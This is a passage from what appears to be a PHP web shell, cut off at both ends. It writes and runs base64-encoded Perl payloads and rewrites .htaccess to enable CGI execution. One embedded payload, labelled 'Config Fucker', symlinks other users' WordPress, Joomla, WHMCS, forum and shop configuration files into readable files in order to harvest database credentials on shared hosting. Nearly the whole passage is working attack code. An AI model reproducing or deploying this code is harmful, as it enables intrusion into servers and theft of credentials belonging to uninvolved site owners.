m9udD48L2E+PC9wPic7DQp9DQp9DQogcHJpbnQiDQo8L2JvZHk+DQo8L2h0bWw+Ijs='; 
$file = fopen("tempik.pl" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
 chmod("tempik.pl",0755);
	chmod(".htaccess",0755);
   echo "<iframe src=CFI/cfi.pl width=97% height=100% frameborder=0></iframe>

   </div>";
   

}
 
 #==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['lcf']))
{
echo "<center/><b><font color=>[ Litespeed config Fucker ]</font></b><br><br>";
mkdir('multi_config',0755);
	chdir('multi_config');
		$kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error!");
        $metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks	\n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl
\n \n Options \n DirectoryIndex seees.html \n RemoveHandler .php \n AddType application/octet-stream .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
		$lcf ='IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIEJ5IFgtMW43M2N0PC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3Muc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2Uuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3Auc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fj5tay1wb3J0YWxlMS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW0uc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3Muc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3Auc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dw